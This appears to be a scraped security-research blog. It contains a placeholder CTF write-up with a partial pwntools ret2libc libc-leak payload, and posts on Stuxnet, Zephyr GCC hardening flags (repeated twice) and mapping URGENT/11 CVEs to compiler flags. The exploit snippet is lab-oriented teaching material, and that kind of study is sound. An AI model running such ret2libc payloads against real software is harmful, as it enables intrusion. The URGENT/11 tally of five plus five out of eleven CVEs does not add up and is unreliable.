Walkthrough of a buffer overflow challenge using ret2libc technique with ASLR bypass.

# PicoCTF 2025: Binary Exploitation

This is a placeholder CTF writeup. Replace with your actual writeup content.

## Challenge Overview

The binary had the following protections:

```
$ checksec --file=./vuln
[*] '/challenge/vuln'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

## Analysis

The vulnerability is a classic stack buffer overflow in `gets()`.

```c
void vuln() {
    char buf[32];
    gets(buf);  // no bounds checking
}
```

## Exploitation

With NX enabled but no canary and no PIE, we use ret2libc.

```python
from pwn import *

p = process('./vuln')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Stage 1: leak libc base
payload = b'A' * 40
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main)

p.sendline(payload)
leak = u64(p.recvline().strip().ljust(8, b'\x00'))
libc.address = leak - libc.sym['puts']
```

## Conclusion

Classic ret2libc. Flag: `picoCTF{example_flag_here}`.

First post. Brief introduction to what this blog is for.

# Hello, World

This is a placeholder general post. Replace with your actual content.

## What This Blog Is

This blog covers four categories:

- **CTF Writeups** — solutions and analysis of capture-the-flag challenges
- **Project Writeups** — deep dives into personal projects
- **Research Writeups** — notes and findings from ongoing research
- **General** — everything else

Most posts will be technical. Some will be short notes. A few might be longer essays.

## Why Blog?

Writing forces clarity. If I can't explain it in writing, I don't understand it well enough.

The target audience is people like me — technical, curious, willing to read long posts with code in them.

Relating Stuxnet to CERIAS Binary Hardening Research
What Stuxnet revealed about the security of embedded systems,

# Relating Stuxnet to CERIAS Binary Hardening Research

My semester-long research project with CERIAS (Center for Education and Research in Information Assurance and Security — Purdue's cybersecurity research center), now a summer endeavor as I use my time back at home to get started on detailed documentation and benchmarking for Zephyr samples, was my first introduction to ICS/OT (Industrial Control Systems / Operational Technology) security. The research question I needed to confront is one of the most talked-about limiting factors in the subfield — how can security professionals implement robust security mechanisms on embedded hardware without betraying the reliability of the critical infrastructure that relies on it? More specifically, I was assigned Zephyr, which Dr. Tian called the "best open-source RTOS (Real-Time Operating System — a lightweight OS designed for resource-constrained embedded devices) the community has to offer", in order to examine binary hardening techniques for Cortex-M3 chips. With the hundreds of hours I have and will continue to put into this research question, it isn't surprising that I view embedded security through an entirely new lens. Every automobile, train, plane, piece of heavy machinery (which will be important here), or otherwise any important contributor to infrastructure here in the United States, is another piece of the attack surface vulnerable to exploitation that I see with fresh eyes.

When I looked for resources to deepen my understanding of ICS/OT security, Stuxnet was at the top of every result. It was one of many cases I enumerated in my search, so I resolved to put down a daily record of the topics I am actively reading and how they connect to my summer research.

Ultimately, not every ICS vulnerability is a result of any failure in the embedded space. Security has been an afterthought in embedded firmware for a generation now, as availability and reliability have taken priority in large, legacy, deterministic systems. Yet that isn't to say that the networks and security protocols surrounding the embedded attack surface are unfamiliar to security professionals. Usually, from what I've read about Stuxnet and other attacks on physical infrastructure, although embedded security — or the lack thereof — enables the exploitation of a system, it is often not the direct cause of it.

In the Stuxnet attack, unauthorized access to PLC (Programmable Logic Controller — the embedded computer directly controlling industrial machinery like centrifuges) configurations was gained through infected USB drives, four Windows zero-day vulnerabilities, and the forging of digital signatures. There is little doubt that significant covert intelligence gathering contributed as well. The point is that embedded systems are the last line of defense on the court, and they have their hands down. The hard part of the Stuxnet attack flow was getting to the point where infected systems could inject malicious configurations into the PLC — the easy part was doing whatever you want once you were already in.

So why do embedded systems lack the robust mechanisms so present in other areas of security? From what I have learned in my research, it comes down to three reasons: it is expensive, the performance constraint tradeoffs aren't worth the added security to most engineers, and OT as a whole persists with old infrastructure because of the downtime required for large system changes.

Embedded security is expensive, and the reason ties directly into the inherent performance constraints of constrained chips like the Cortex-M3 I work on. Embedded devices operate with low clock speeds and limited RAM. As a result, engineers need specialized security solutions to achieve any meaningful level of protection. In my research, I encountered the memory constraints of these chips firsthand and learned a great deal about the difference between physical and virtual memory. On embedded devices, there is typically a fixed amount of physical memory assigned at boot — there is no room for the overhead that virtual memory mapping and the extra cycles it requires. I've read about solutions like MPUs (Memory Protection Units — hardware components that enforce memory access boundaries between regions) and Dr. Tian's CRT-C, a memory-safe approach to vulnerable C language features. Discovering these solutions is expensive in the first place, yet the biggest cost comes when implementing them into old, proven systems. For the heavy machinery that operates with constrained devices, reliability and uptime are the highest priorities. Even a second of delay on a manufacturing line results in money lost. Even a second of delay on centrifuge operation could set back an enrichment program by days.

After researching Stuxnet's attack flow — specifically how attackers operated once they had already compromised the system — I identified a few ways the PLC configuration mechanism could have been more resistant to this class of attack.

1. **Code signing on PLC uploads** — Stuxnet injected code blocks with no authentication whatsoever. Requiring cryptographically signed code blocks during the upload process would have rejected the malware's attempt to alter centrifuge behavior. Code signing carries only minimal runtime overhead since verification occurs at upload time, not during execution.

2. **HMAC on Step 7 communications** — In Stuxnet's case, the engineer's workstation sent legitimate PLC programs through Siemens' proprietary S7 protocol to the controller. The malware's DLL (Dynamic Link Library — a reusable code module that Windows applications load at runtime) sat inside the Step 7 process and intercepted the data stream mid-transfer to append malicious code blocks. The PLC received no indication of on-path tampering. An HMAC (Hash-based Message Authentication Code — a cryptographic checksum that verifies both the integrity and authenticity of a message) on the communication channel would have detected modifications to the upload stream before anything malicious reached the controller.

3. **Hardware-enforced VFD operating bounds** — This one is less about the Step 7 process and more about a safety mechanism on the centrifuge itself. A bounds checker at the VFD (Variable Frequency Drive — the electronic controller regulating centrifuge motor spin speed) level, independent of PLC logic, would refuse any command outside safe RPM (Revolutions Per Minute) parameters. This requires no cryptography and near-zero compute overhead, and it would have prevented the physical destruction of the centrifuges entirely.

Overall, Stuxnet is interesting not only for what it reveals about cybersecurity, but also in the broader geopolitical context of uranium enrichment and ongoing US-Iran tensions. I'll be returning to both threads throughout this summer's reading.

An introduction to the gcc_flag_simulations repository — what it is, why it exists, and how it works.

# GCC Flag Simulations: Project Overview

This is a placeholder project writeup. Replace with your actual content.

## What Is This?

The `gcc_flag_simulations` repository is a collection of C files that manually simulate the mechanisms injected by GCC hardening flags — without actually enabling the flags.

## Why?

Understanding what GCC *actually does* when you pass `-fstack-protector-strong` requires reading the generated assembly or the GCC source. This project takes a different approach: reimplement the mechanism in plain C, with full documentation.

## Repository Structure

Each file corresponds to one hardening mechanism:

```
gcc_flag_simulations/
├── stack_protector/
│   ├── basic.c          # simulates -fstack-protector
│   └── strong.c         # simulates -fstack-protector-strong
├── fortify_source/
│   └── memcpy.c         # simulates FORTIFY_SOURCE for memcpy
└── README.md
```

## How to Use

Clone the repo and read the source files alongside the GCC documentation.

```bash
git clone https://github.com/kristianjosipuremovic/gcc_flag_simulations
```

Each file is fully commented and stands alone as documentation.

Zephyr RTOS + GCC Hardening: What's Actually Available
Documenting which GCC hardening flags are available on arm-zephyr-eabi-gcc SDK 0.17.0 and which are exposed through Zephyr Kconfig.

# Zephyr RTOS + GCC Hardening: What's Actually Available

This is a placeholder research writeup. Replace with your actual research notes.

## Background

Part of the CERIAS binary hardening research is enumerating which GCC hardening flags are actually available on the target toolchain: `arm-zephyr-eabi-gcc` from Zephyr SDK 0.17.0.

## Methodology

For each hardening flag, I:
1. Attempted to compile a minimal test program with the flag enabled
2. Checked the compiler output for errors or warnings
3. Inspected the generated assembly to confirm the mechanism was injected

## Results

| Flag | Available | Notes |
|------|-----------|-------|
| `-fstack-protector` | ✓ | Full family available |
| `-fstack-protector-strong` | ✓ | Preferred option |
| `-fstack-protector-all` | ✓ | Maximum coverage |
| `FORTIFY_SOURCE` | ✓ | Available at levels 1 and 2 |
| `-fPIE` | ✓ | Position-independent executables |
| `-fsanitize=address` | ✗ | Not supported on bare-metal ARM |
| `-fcf-protection` | ✗ | ARM architecture does not support CET |

## Kconfig Cross-Reference

Despite the compiler supporting `-fstack-protector-strong`, Zephyr's Kconfig exposes zero stack protector variants.[^kconfig] This means enabling the flag requires manual CMake modification.

[^kconfig]: Confirmed against Zephyr SDK 0.17.0. Future SDK releases may expose these via `CONFIG_STACK_SENTINEL` or similar — worth rechecking on upgrade.

## Key Finding

The `FUNC_NO_STACK_PROTECTOR` macro in `gcc.h` reveals that Zephyr was *designed* assuming global stack canary enablement — functions that cannot tolerate the overhead explicitly opt out rather than opting in.[^macro]

[^macro]: See `include/zephyr/toolchain/gcc.h` in the Zephyr source tree. The macro disables the canary for ISR entry stubs where the extra frame overhead breaks the ABI contract.

Zephyr RTOS + GCC Hardening: What’s Actually Available

This is a placeholder research writeup. Replace with your actual research notes.

Background

Part of the CERIAS binary hardening research is enumerating which GCC hardening flags are actually available on the target toolchain: arm-zephyr-eabi-gcc from Zephyr SDK 0.17.0.

Methodology

For each hardening flag, I:

  1. Attempted to compile a minimal test program with the flag enabled
  2. Checked the compiler output for errors or warnings
  3. Inspected the generated assembly to confirm the mechanism was injected

Results

FlagAvailableNotes
-fstack-protector✓Full family available
-fstack-protector-strong✓Preferred option

FORTIFY_SOURCE✓Available at levels 1 and 2
-fPIE✓Position-independent executables

Kconfig Cross-Reference

Despite the compiler supporting -fstack-protector-strong, Zephyr’s Kconfig exposes zero stack protector variants.1 This means enabling the flag requires manual CMake modification.

Key Finding

The FUNC_NO_STACK_PROTECTOR macro in gcc.h reveals that Zephyr was designed assuming global stack canary enablement — functions that cannot tolerate the overhead explicitly opt out rather than opting in.2

Footnotes

  1. Confirmed against Zephyr SDK 0.17.0. Future SDK releases may expose these via CONFIG_STACK_SENTINEL or similar — worth rechecking on upgrade. ↩

  2. See include/zephyr/toolchain/gcc.h in the Zephyr source tree. The macro disables the canary for ISR entry stubs where the extra frame overhead breaks the ABI contract. ↩

URGENT/11: Mapping GCC Hardening Flags to VxWorks Zero-Days
Mapping compiler-level binary hardening flags to the URGENT/11 VxWorks zero-days and where they could have raised the cost of exploitation.

# URGENT/11: Mapping GCC Hardening Flags to VxWorks Zero-Days

VxWorks is a popular real-time operating system (RTOS) developed by Wind River Systems. It is characterized by its high reliability, which makes it a popular choice for mission-critical systems in aerospace and defense, medical devices, industrial automation, and the automotive industry. With this in mind, any vulnerability to this RTOS could have serious consequences for the affected industries.

In 2019, this fear was actualized with the discovery of not just one vulnerability, but 11 of them on the VxWorks IPnet stack, and any connected device that utilized this stack was affected by at least one of the eleven. According to Armis Labs, "A compromised industrial controller could shut down a factory, and a pwned patient monitor could have a life-threatening effect." URGENT/11 was a serious wakeup call for the vulnerabilities in this specific stack, yet a general mindfulness for embedded security can be applied broadly to this event.

The CERIAS research on embedded binary hardening I am conducting this summer revolves directly around an ontology of compiler-level hardening flags that I gathered while parsing through the Zephyr RTOS and its documentation. The making of this ontology involved many hours spent classifying and understanding each of these flags. One of the projects I worked on throughout the beginning of the summer was a GitHub repository of every flag programmatically represented in C code — a tool to build understanding and avoid getting lost in the high-level abstractions of the work.

My first thought when exploring URGENT/11 was to examine whether any of the flags I classified could have helped secure Wind River's vulnerabilities, or raised the cost of exploitation for each. Below, I went through each of the 11 vulnerabilities outlined in the URGENT/11 report and attributed a flag which could have raised exploitation cost for any that apply. In the case where none of the flags apply — such as when the vulnerability was caused by a protocol-level failure — I left it at an explanation.

To clarify, out of the 11 CVEs, I will only focus on the five RCE vulnerabilities since they are the class of vulnerabilities where compiler-level binary hardening is relevant. The remaining five, which stem from logical and protocol-level flaws, are outside the scope of what compiler flags can protect against.

- **CVE-2019-12256** — Stack overflow in IPv4 options parsing. `-fstack-protector-strong` would have placed a canary between the buffer and return address, turning a clean RCE into a detectable crash.
- **CVE-2019-12255** — TCP Urgent Pointer integer underflow leading to memory corruption. `-fstack-protector` and `-D_FORTIFY_SOURCE=2` add bounds awareness on the buffer operations downstream of the underflow, raising exploitation cost significantly.
- **CVE-2019-12260** — TCP Urgent Pointer state confusion leading to memory corruption. `-fstack-protector` applies here for the same reason; the corruption targets stack-resident buffers whose overwrite a canary would have detected.
- **CVE-2019-12261** — TCP Urgent Pointer off-by-one write. `-D_FORTIFY_SOURCE=2` replaces unsafe memory copy calls with bounds-checked versions, catching off-by-one writes at the point of operation rather than at function return.
- **CVE-2019-12263** — TCP Urgent Pointer race condition leading to memory corruption. `-fstack-protector` would detect the resulting buffer corruption at function return, limiting clean exploitation.

Overall, this was primarily a case of RCE as a result of stack overflow, so the diversity of options in the mapping process were limited. My conclusion based on this exercise is that every major system will have vulnerabilities — it is just a matter of how expensive you make them to exploit. Stack canaries, fortified source, and bounds-checked operations are standard flags that make exploitation of these vulnerability classes significantly more costly. As to why they were not implemented in VxWorks, that is the same problem I confront in my research question. Availability and reliability have historically taken precedence on deterministic systems where every nanosecond matters.
